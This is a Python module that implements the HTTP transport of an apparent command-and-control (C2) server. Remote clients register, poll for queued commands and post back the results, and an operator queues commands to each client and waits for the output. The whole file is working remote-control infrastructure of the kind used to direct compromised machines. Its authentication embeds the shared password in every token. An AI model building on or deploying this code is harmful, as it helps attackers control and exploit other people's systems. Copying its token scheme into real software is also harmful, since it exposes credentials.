import logging
import threading
import http.server
import socketserver
import json
import uuid
import base64
import time
from typing import Dict, Optional, Callable, Tuple
import queue

from ..session.client_session import ClientSession
from .base_server import BaseServer

logger = logging.getLogger('c2.http')

class HTTPChannel:
    """Virtual channel for HTTP transport"""
    
    def __init__(self, client_id: str):
        self.client_id = client_id
        self.command_queue = queue.Queue()
        self.response_map: Dict[str, str] = {}
        self.last_activity = time.time()
    
    def send_command(self, command: str) -> str:
        """Send a command and wait for response"""
        cmd_id = str(uuid.uuid4())
        self.command_queue.put((cmd_id, command))
        
        # Wait for response with timeout
        timeout = 60  # seconds
        start_time = time.time()
        while cmd_id not in self.response_map and (time.time() - start_time) < timeout:
            time.sleep(0.1)
            
        if cmd_id in self.response_map:
            response = self.response_map[cmd_id]
            del self.response_map[cmd_id]
            self.last_activity = time.time()
            return response
        
        return "Error: Command timed out"
    
    def get_next_command(self) -> Tuple[str, str]:
        """Get the next command for the client"""
        try:
            cmd_id, command = self.command_queue.get(block=False)
            self.last_activity = time.time()
            return cmd_id, command
        except queue.Empty:
            return None, None
    
    def set_response(self, cmd_id: str, response: str) -> None:
        """Set the response for a command"""
        self.response_map[cmd_id] = response
        self.last_activity = time.time()


class HTTPHandler(http.server.BaseHTTPRequestHandler):
    """HTTP request handler for C2 server"""
    
    def log_message(self, format, *args):
        # Redirect logs to our logger
        if args[0].startswith("GET") or args[0].startswith("POST"):
            logger.debug(format % args)
        
    def do_GET(self):
        """Handle GET requests - clients pulling commands"""
        try:
            # Check authentication
            auth_header = self.headers.get('Authorization', '')
            if not auth_header.startswith('Bearer '):
                self.send_error(401, "Unauthorized")
                return
                
            token = auth_header[7:]  # Remove 'Bearer ' prefix
            if not self.authenticate(token):
                self.send_error(403, "Forbidden")
                return
                
            client_id = self.get_client_id(token)
            channel = self.server.get_channel(client_id)
            
            if not channel:
                self.send_error(404, "Session not found")
                return
                
            # Check for commands
            cmd_id, command = channel.get_next_command()
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            
            if command:
                response = {
                    'cmd_id': cmd_id,
                    'command': command
                }
            else:
                response = {
                    'cmd_id': None,
                    'command': None
                }
                
            self.wfile.write(json.dumps(response).encode())
            
        except Exception as e:
            logger.error(f"Error handling GET request: {e}")
            self.send_error(500, "Internal server error")
    
    def do_POST(self):
        """Handle POST requests - client registration and command responses"""
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length == 0:
                self.send_error(400, "Bad request")
                return
                
            body = self.rfile.read(content_length).decode(errors='replace')
            data = json.loads(body)
            
            if self.path == '/register':
                self.handle_registration(data)
            elif self.path == '/response':
                self.handle_response(data)
            else:
                self.send_error(404, "Not found")
                
        except Exception as e:
            logger.error(f"Error handling POST request: {e}")
            self.send_error(500, "Internal server error")
    
    def handle_registration(self, data):
        """Handle client registration"""
        try:
            client_info = json.dumps(data.get('client_info', {}))
            
            # Create a unique token for this client
            client_id = str(uuid.uuid4())
            token = self.generate_token(client_id)
            
            # Create a channel for communication
            channel = HTTPChannel(client_id)
            self.server.add_channel(client_id, channel)
            
            # Get client address
            client_addr = self.client_address
            
            # Create a client session
            client = ClientSession(channel, client_info, client_addr, 'http')
            self.server.register_client(client)
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            
            response = {
                'token': token,
                'client_id': client_id,
                'status': 'registered'
            }
            
            self.wfile.write(json.dumps(response).encode())
            
        except Exception as e:
            logger.error(f"Error registering client: {e}")
            self.send_error(500, "Registration failed")
    
    def handle_response(self, data):
        """Handle command response"""
        try:
            auth_header = self.headers.get('Authorization', '')
            if not auth_header.startswith('Bearer '):
                self.send_error(401, "Unauthorized")
                return
                
            token = auth_header[7:]  # Remove 'Bearer ' prefix
            if not self.authenticate(token):
                self.send_error(403, "Forbidden")
                return
                
            client_id = self.get_client_id(token)
            cmd_id = data.get('cmd_id')
            response = data.get('response', '')
            
            if not cmd_id:
                self.send_error(400, "Missing cmd_id")
                return
                
            channel = self.server.get_channel(client_id)
            if not channel:
                self.send_error(404, "Session not found")
                return
                
            # Store the response
            channel.set_response(cmd_id, response)
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            
            self.wfile.write(json.dumps({'status': 'ok'}).encode())
            
        except Exception as e:
            logger.error(f"Error processing response: {e}")
            self.send_error(500, "Internal server error")
    
    def authenticate(self, token: str) -> bool:
        """Authenticate a token"""
        try:
            parts = token.split('.')
            if len(parts) != 2:
                return False
                
            client_id, key = parts
            expected_key = self.server.config['password']
            
            # Simple authentication - in a real implementation you'd use proper JWT
            return key == expected_key
            
        except Exception:
            return False
    
    def get_client_id(self, token: str) -> str:
        """Extract client ID from token"""
        try:
            parts = token.split('.')
            if len(parts) != 2:
                return None
                
            return parts[0]
        except Exception:
            return None
    
    def generate_token(self, client_id: str) -> str:
        """Generate an authentication token"""
        # Simple token format: client_id.password
        # In a real implementation, you'd use proper JWT
        return f"{client_id}.{self.server.config['password']}"


class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    """Threaded HTTP server for handling multiple connections"""
    
    def __init__(self, server_address, RequestHandlerClass, config, client_callback):
        super().__init__(server_address, RequestHandlerClass)
        self.config = config
        self.client_callback = client_callback
        self.channels: Dict[str, HTTPChannel] = {}
    
    def add_channel(self, client_id: str, channel: HTTPChannel) -> None:
        """Add a channel for a client"""
        self.channels[client_id] = channel
    
    def get_channel(self, client_id: str) -> Optional[HTTPChannel]:
        """Get a channel by client ID"""
        return self.channels.get(client_id)
    
    def register_client(self, client: ClientSession) -> None:
        """Register a new client with the callback"""
        if self.client_callback:
            self.client_callback(client)


class HTTPServer(BaseServer):
    """HTTP transport implementation for C2 server"""
    
    def __init__(self, config: dict, client_connected_callback: Callable = None):
        super().__init__(config, client_connected_callback)
        self.http_server = None
    
    def start(self):
        """Start the HTTP server"""
        if self.running:
            logger.warning("HTTP server already running")
            return
            
        try:
            server_address = (self.config['bind_address'], self.config['http_port'])
            self.http_server = ThreadedHTTPServer(
                server_address, 
                HTTPHandler, 
                self.config, 
                self.add_client
            )
            
            self.running = True
            logger.info(f"HTTP server listening on {self.config['bind_address']}:{self.config['http_port']}")
            
            self.server_thread = threading.Thread(target=self.http_server.serve_forever)
            self.server_thread.daemon = True
            self.server_thread.start()
            
        except Exception as e:
            logger.error(f"Failed to start HTTP server: {e}")
            if self.http_server:
                self.http_server.shutdown()
                self.http_server = None
            raise
    
    def stop(self):
        """Stop the HTTP server"""
        self.running = False
        if self.http_server:
            self.http_server.shutdown()
            self.http_server = None
        logger.info("HTTP server stopped")